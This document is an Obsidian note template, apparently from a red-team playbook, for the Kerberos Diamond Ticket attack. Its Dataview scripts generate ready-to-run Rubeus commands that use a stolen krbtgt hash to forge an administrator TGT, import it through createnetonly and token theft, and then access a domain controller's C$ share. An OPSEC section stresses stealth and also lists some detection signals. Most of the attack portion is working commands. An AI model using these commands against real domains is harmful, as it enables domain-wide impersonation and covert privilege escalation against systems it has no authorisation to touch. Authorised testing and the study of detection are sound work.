---
# Attack-specific fields
impersonate_user:
krbtgt_aes256:
krbtgt_ntlm:
diamond_ticket:
target_host_fqdn:
notes:
---

# Diamond Ticket

> [!abstract] Attack Summary
> A **Diamond Ticket** modifies a **legitimate TGT** instead of forging one from scratch. Rubeus requests a real TGT (via `tgtdeleg`), then decrypts and modifies it using the krbtgt hash. The result is a ticket that looks like a genuine AS-REQ/AS-REP exchange — harder to detect than a Golden Ticket.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",     b?.domain     ?? "—"],
  ["DC FQDN",    b?.dc_fqdn    ?? "—"],
  ["Domain SID", b?.domain_sid ?? "—"],
  ["Username",   b?.username   ?? "—"],
  ["OS Env",     b?.os_env     ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["User to Impersonate",    `\`INPUT[text(defaultValue("${p.impersonate_user ?? 'administrator'}")):impersonate_user]\``],
  ["krbtgt AES-256 Hash",   `\`INPUT[text:krbtgt_aes256]\``],
  ["krbtgt NTLM Hash (RC4)",`\`INPUT[text:krbtgt_ntlm]\``],
  ["Target Host FQDN",      `\`INPUT[text:target_host_fqdn]\``],
]);
```

> [!info] Prerequisites
> - `krbtgt` AES-256 or NTLM hash (from DCSync — see [[07 - DCSync]])
> - Current user's TGT (used as base for modification — obtained via `tgtdeleg`)

---

## Step 1 — Obtain krbtgt Hash

See [[07 - DCSync]] to extract the krbtgt hash.

Enter hashes: `INPUT[text:krbtgt_aes256]` (AES-256) | `INPUT[text:krbtgt_ntlm]` (NTLM)

---

## Step 2 — Forge the Diamond Ticket

> [!tip] Diamond Tickets use `tgtdeleg` to get a real forwardable TGT first, then modify it. Must run in a beacon with a valid Kerberos session.

**Windows — Rubeus (AES-256 preferred)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain     ?? "domain.local";
const sid         = b?.domain_sid ?? "S-1-5-21-REPLACE";
const impersonate = p?.impersonate_user || "administrator";
const aes256      = p?.krbtgt_aes256   || "AES256_HASH";
const ntlm        = p?.krbtgt_ntlm     || "NTLM_HASH";

dv.paragraph("```bash\n# Preferred: AES-256 (stealthiest)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe diamond " +
  "/tgtdeleg /impersonateuser:" + impersonate + " /msdsspn:krbtgt/" + domain +
  " /aes256:" + aes256 + " /nowrap\n\n# Alternative: RC4\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe diamond " +
  "/tgtdeleg /impersonateuser:" + impersonate + " /msdsspn:krbtgt/" + domain +
  " /rc4:" + ntlm + " /nowrap\n\n# Without tgtdeleg (provide your own TGT)\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe diamond " +
  "/ticket:BASE64_TGT /impersonateuser:" + impersonate + " /msdsspn:krbtgt/" + domain +
  " /aes256:" + aes256 + " /nowrap\n```");
```

Paste diamond ticket: `INPUT[text:diamond_ticket]`

---

## Step 3 — Import and Use the Ticket

**Windows — createnetonly**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const shortDomain = domain.split('.')[0].toUpperCase();
const impersonate = p?.impersonate_user || "administrator";
const ticket      = p?.diamond_ticket   || "BASE64_TICKET";
const targetFqdn  = p?.target_host_fqdn || "dc.domain.local";

dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + shortDomain +
  " /username:" + impersonate + " /password:FakePass /ticket:" + ticket + "\n\nsteal_token PID\n\n# Verify\nrun klist\nls \\\\" + targetFqdn + "\\c$\n```");
```

---

## Diamond vs Golden vs Silver

| Feature | Golden | Diamond | Silver |
|---|---|---|---|
| Requires krbtgt hash | Yes | Yes | No (service hash) |
| Goes through KDC | No | Yes (real AS-REQ) | No |
| Forges from scratch | Yes | No (modifies real TGT) | Yes |
| Detection difficulty | Medium | High (stealthiest) | High |
| Scope | Domain-wide | Domain-wide | Single service |
| Generates 4768 event | No | Yes (legitimate) | No |

---

## OPSEC

> [!warning] Detection Indicators
> - Diamond tickets generate a **real 4768 event** because they use `tgtdeleg` → harder to detect than Golden Tickets.
> - The PAC contains legitimate timestamps and encryption — evades PAC validation checks.
> - Still detectable if privileges in PAC don't match the user's actual group memberships (compare with 4672 events).
> - Anomalous logon patterns remain detectable via behavioral analytics.

---

## Notes & Results

`INPUT[textarea:notes]`
